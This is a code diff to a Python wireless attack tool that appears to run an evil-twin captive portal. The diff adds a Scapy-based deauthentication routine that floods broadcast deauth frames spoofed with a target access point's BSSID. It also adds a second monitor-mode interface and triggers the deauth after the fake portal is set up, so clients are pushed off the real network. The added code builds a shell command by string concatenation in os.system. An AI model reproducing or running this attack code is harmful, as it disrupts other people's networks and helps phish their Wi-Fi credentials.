@@ -417,6 +417,36 @@ class networkInterfaces:
 
         return 0
 
+    def deauth(self, nInterface, bssid, channel):
+        if type(nInterface) is not int:
+            print('[x] Input value is not an integer!\n')
+            return -1
+
+        if nInterface < 0 or nInterface >= len(self.interfaces):
+            print('[x] Input value out of bounds!\n')
+            return -1
+
+        interface = self.interfaces[nInterface]
+
+        if interface['mode'] != 'monitor':
+            print('[x] Selected interface is not in monitor mode!\n')
+            return -1
+
+        # Change channel
+        os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + channel)
+        
+        # Craft packet
+        pkt = RadioTap()/Dot11(addr1 = 'FF:FF:FF:FF:FF:FF', addr2 = bssid, addr3 = bssid)/Dot11Deauth()
+
+        def sendPkt():
+            for i in range(50):
+                send(pkt)
+
+        deauthThread = threading.Thread(target = sendPkt)
+        deauthThread.start()
+
+        print('[+] Sending deauth packets to ' + bssid + ' via channel ' + channel)
+
 def configWebApp():
     # Config captive portal files
     print('[-] Copying web files...')
@@ -482,10 +512,11 @@ if len(networkInterfaces.interfaces) == 0:
     quit()
 
 elif len(networkInterfaces.interfaces) == 1:
-    if networkInterfaces.interfaces[0]['mode'] != 'monitor':
-        if networkInterfaces.putInMonitor(0) != 0:
-            quit()
     interface = 0
+    if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
+        if networkInterfaces.putInMonitor(interface) != 0:
+            print('[x] Network interface couldn\'t be put in monitor mode')
+            quit() 
 
 elif len(networkInterfaces.interfaces) > 1:
     ok = -1
@@ -554,8 +585,44 @@ while op < 1 or op > 4:
         configWebApp()
 
     elif op == 2:
+        # Select network interface 2
+        if len(networkInterfaces.interfaces) == 1:
+            print('[x] Not enough network interface detected (2)!\n')
+            quit()
+
+        elif len(networkInterfaces.interfaces) == 2:
+            if interface == 0:
+                interface2 = 1
+            else:
+                interface2 = 0
+            
+            if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
+                if networkInterfaces.putInMonitor(interface2) != 0:
+                    print('[x] Second network interface couldn\'t be put in monitor mode')
+                    quit()
+
+
+        elif len(networkInterfaces.interfaces) > 2:
+            ok = -1
+            while ok != 0: 
+                print(networkInterfaces)
+                interface2 = int(input('Select network interface > ')) - 1
+                print()
+                if interface2 < 0 or interface2 >= len(networkInterfaces.interfaces): 
+                    print('[x] Input value out of bounds!')
+                elif interface2 == interface:
+                    print('[x] ' + networkInterfaces.interfaces[interface]['name'] + ' already in use!')
+                else:
+                    if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
+                        ok = networkInterfaces.putInMonitor(interface2)
+                    else:
+                        ok = 0
+
+        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'])
+        
         accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
         
+        bssid = accessPoint['bssid']
         ssid = accessPoint['ssid']
         channel = accessPoint['channel']
         encryption = accessPoint['encryption']
@@ -568,10 +635,49 @@ while op < 1 or op > 4:
 
         # Config web app
         configWebApp()
+
+        # Deauth AP
+        networkInterfaces.deauth(interface2, bssid, channel)
 
     elif op == 3:
+        # Select network interface 2
+        if len(networkInterfaces.interfaces) == 1:
+            print('[x] Not enough network interface detected (2)!\n')
+            quit()
+
+        elif len(networkInterfaces.interfaces) == 2:
+            if interface == 0:
+                interface2 = 1
+            else:
+                interface2 = 0
+            
+            if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
+                if networkInterfaces.putInMonitor(interface2) != 0:
+                    print('[x] Second network interface couldn\'t be put in monitor mode')
+                    quit()
+
+
+        elif len(networkInterfaces.interfaces) > 2:
+            ok = -1
+            while ok != 0: 
+                print(networkInterfaces)
+                interface2 = int(input('Select network interface > ')) - 1
+                print()
+                if interface2 < 0 or interface2 >= len(networkInterfaces.interfaces): 
+                    print('[x] Input value out of bounds!')
+                elif interface2 == interface:
+                    print('[x] ' + networkInterfaces.interfaces[interface]['name'] + ' already in use!')
+                else:
+                    if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
+                        ok = networkInterfaces.putInMonitor(interface2)
+                    else:
+                        ok = 0
+
+        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'])
+
         accessPoint = networkInterfaces.sniffUsedAccessPoints(interface, sigint_handler)
         
+        bssid = accessPoint['bssid']
         ssid = accessPoint['ssid']
         channel = accessPoint['channel']
         encryption = accessPoint['encryption']
@@ -584,6 +690,9 @@ while op < 1 or op > 4:
 
         # Config web app
         configWebApp()
+
+        # Deauth AP
+        networkInterfaces.deauth(interface2, bssid, channel)
 
     elif op == 4:
         probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
